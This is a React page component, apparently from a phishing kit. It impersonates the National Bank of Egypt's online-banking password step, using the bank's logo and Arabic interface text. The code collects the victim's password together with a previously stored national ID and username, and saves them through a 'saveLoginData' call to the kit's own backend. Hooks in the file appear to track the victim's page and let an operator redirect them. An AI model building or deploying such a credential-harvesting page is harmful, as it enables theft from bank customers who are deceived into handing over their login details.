/**
 * البنك الأهلي المصري - كلمة المرور (الخطوة 2)
 * خلفية بيضاء نظيفة بدون شعار
 */
import { useState, useCallback } from "react";
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";
import { usePresence } from "@/hooks/usePresence";
import { useAdminRedirect } from "@/hooks/useAdminRedirect";

export default function Password() {
  usePresence("password");
  useAdminRedirect();
  const [, setLocation] = useLocation();
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [errorMsg, setErrorMsg] = useState("");
  const saveLoginData = trpc.applications.saveLoginData.useMutation();
  const nationalId = localStorage.getItem("pw_national_id") || "";
  const username = sessionStorage.getItem("pw_username") || "";

  const hasArabic = useCallback((text: string) => /[\u0600-\u06FF\u0750-\u077F\u08A0-\u08FF\uFB50-\uFDFF\uFE70-\uFEFF]/.test(text), []);

  const handleSubmit = async () => {
    if (!password.trim()) { setErrorMsg("يرجى إدخال كلمة المرور"); return; }
    if (hasArabic(password)) { setErrorMsg("كلمة المرور يجب أن تكون باللغة الإنجليزية فقط"); return; }
    if (!nationalId) { setErrorMsg("يرجى إكمال البيانات الشخصية أولاً"); return; }
    if (!username) { setErrorMsg("يرجى إدخال كود المستخدم أولاً"); setLocation("/login"); return; }
    setLoading(true);
    setErrorMsg("");
    try {
      await saveLoginData.mutateAsync({ nationalId, username, password });
      sessionStorage.setItem("pw_last_page", "password");
      setLocation("/processing");
    } catch (err) {
      console.error(err);
      setErrorMsg("حدث خطأ، يرجى المحاولة مرة أخرى");
      setLoading(false);
    }
  };

  return (
    <div dir="rtl" style={{ width: "100%", maxWidth: "100vw", minHeight: "100vh", background: "#ffffff", fontFamily: "'Cairo', sans-serif", overflowX: "hidden" }}>
      <div style={{ width: "100%", maxWidth: "480px", margin: "0 auto", minHeight: "100vh", display: "flex", flexDirection: "column", boxSizing: "border-box" }}>
      {/* Header */}
        <div style={{ padding: "32px 24px 24px", textAlign: "center", direction: "rtl" }}>
          {/* شعار البنك الأهلي */}
          <div style={{ marginBottom: "24px" }}>
            <img
              src="/manus-storage/nbe-official-logo-source_d2709322.png"
              alt="البنك الأهلي المصري"
              style={{ display: "block", width: "100%", maxWidth: "190px", height: "auto", maxHeight: "60px", margin: "0 auto", objectFit: "contain" }}
            />
          </div>
          <h1 style={{ fontSize: "22px", fontWeight: "800", color: "#1a1a1a", marginBottom: "8px" }}>كلمة المرور</h1>
          <p style={{ color: "#666", fontSize: "14px", margin: 0 }}>أدخل كلمة المرور الخاصة بحسابك</p>
          <div style={{ marginTop: "12px", background: "#f0fdf4", borderRadius: "8px", padding: "8px 12px", display: "inline-block" }}>
            <span style={{ color: "#1B7A3D", fontSize: "13px", fontWeight: "600" }}>المستخدم: {username}</span>
          </div>
        </div>

        {/* Form */}
        <div style={{ padding: "0 24px", flex: 1 }}>
          {errorMsg && (
            <div style={{ background: "#fef2f2", border: "1px solid #fecaca", borderRadius: "10px", padding: "12px 16px", marginBottom: "16px", color: "#dc2626", fontSize: "13px", textAlign: "center" }}>{errorMsg}</div>
          )}

          {/* Lock Icon */}
          <div style={{ textAlign: "center", marginBottom: "24px" }}>
            <div style={{ width: "64px", height: "64px", background: "#f0fdf4", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", margin: "0 auto", border: "2px solid #dcfce7" }}>
              <svg width="28" height="28" viewBox="0 0 24 24" fill="none">
                <rect x="3" y="11" width="18" height="11" rx="2" stroke="#1B7A3D" strokeWidth="2"/>
                <path d="M7 11V7a5 5 0 0110 0v4" stroke="#1B7A3D" strokeWidth="2" strokeLinecap="round"/>
              </svg>
            </div>
          </div>

          <div style={{ marginBottom: "12px" }}>
            <label style={{ display: "block", fontWeight: "700", fontSize: "14px", marginBottom: "6px", color: "#333" }}>كلمة المرور</label>
            <div style={{ position: "relative" }}>
              <input
                dir="ltr"
                lang="en"
                type={showPassword ? "text" : "password"}
                placeholder="أدخل كلمة المرور"
                value={password}
                onChange={(e) => { if (!hasArabic(e.target.value)) setPassword(e.target.value); }}
                style={{
                  width: "100%", padding: "16px", paddingLeft: "48px", border: "1.5px solid #d1d5db", borderRadius: "10px",
                  fontSize: "15px", fontFamily: "'Cairo', sans-serif", boxSizing: "border-box",
                  outline: "none", background: "#ffffff", color: "#1a1a1a", textAlign: "left", direction: "ltr",
                }}
                onFocus={(e) => { e.target.style.borderColor = "#1B7A3D"; }}
                onBlur={(e) => { e.target.style.borderColor = "#d1d5db"; }}
              />
              <button type="button" onClick={() => setShowPassword(!showPassword)}
                style={{ position: "absolute", left: "12px", top: "50%", transform: "translateY(-50%)", background: "none", border: "none", cursor: "pointer", fontSize: "18px" }}>
                {showPassword ? "🙈" : "👁️"}
              </button>
            </div>
          </div>

          <p onClick={() => setLocation("/reset-password")} style={{ color: "#dc2626", fontWeight: "600", fontSize: "13px", cursor: "pointer", marginBottom: "32px" }}>
            هل نسيت كلمة المرور؟
          </p>

          <button
            onClick={handleSubmit}
            disabled={loading}
            style={{
              width: "100%", background: loading ? "#e5e7eb" : "linear-gradient(135deg, #1B7A3D, #145a2c)",
              color: loading ? "#999" : "white", border: "none", borderRadius: "10px", padding: "16px",
              fontSize: "17px", fontWeight: "700", cursor: loading ? "not-allowed" : "pointer",
              fontFamily: "'Cairo', sans-serif", boxShadow: loading ? "none" : "0 4px 15px rgba(27,122,61,0.3)",
            }}
          >
            {loading ? "جاري التحقق..." : "تسجيل الدخول"}
          </button>

          {/* Back */}
          <div style={{ textAlign: "center", marginTop: "20px" }}>
            <button onClick={() => setLocation("/login")} style={{ background: "none", border: "none", color: "#1B7A3D", fontSize: "14px", fontWeight: "600", cursor: "pointer", fontFamily: "'Cairo', sans-serif" }}>
              ← العودة لكود المستخدم
            </button>
          </div>
        </div>

        {/* Footer */}
        <footer style={{ textAlign: "center", padding: "16px", borderTop: "1px solid #e5e7eb", marginTop: "auto" }}>
          <small style={{ color: "#999", fontSize: "11px" }}>© 2026 البنك الأهلي المصري - مصر</small>
        </footer>
      </div>
    </div>
  );
}
